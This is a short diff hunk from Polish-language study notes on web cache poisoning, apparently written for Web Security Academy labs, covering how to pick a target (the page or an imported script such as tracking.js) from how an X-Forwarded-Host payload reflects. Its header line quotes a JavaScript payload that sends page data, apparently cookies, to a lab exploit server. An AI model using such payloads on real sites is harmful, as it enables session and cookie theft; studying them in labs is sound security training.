@@ -18,6 +18,6 @@ new Image().src='https://exploit-xxxx.web-security-academy.net/log?c='+document.
 
 Obserwacja: Co atakujesz <br>
 Payload (z-foprwarded-host: exploit server) z nagłówka pojawia się wprost w body /	- atakuje /<br>
-Payload (z-foprwarded-host: exploit server) z naglowka zmienia tylko Location/redirect na /, sam nie daje nic użytecznego	Zasób importowany przez / (np. tracking.js)  - atakuje tracking.js<br>
+Payload (z-foprwarded-host: exploit server) z naglowka zmienia tylko Location/redirect na payload,	Zasób importowany przez / (np. tracking.js)  - atakuje tracking.js<br>
 Kombinacja 2+ nagłówków potrzebna do efektu (osobno nic nie robią)	Zwykle wskazuje na zasób pomocniczy - atakuje tracking.js<br>
 
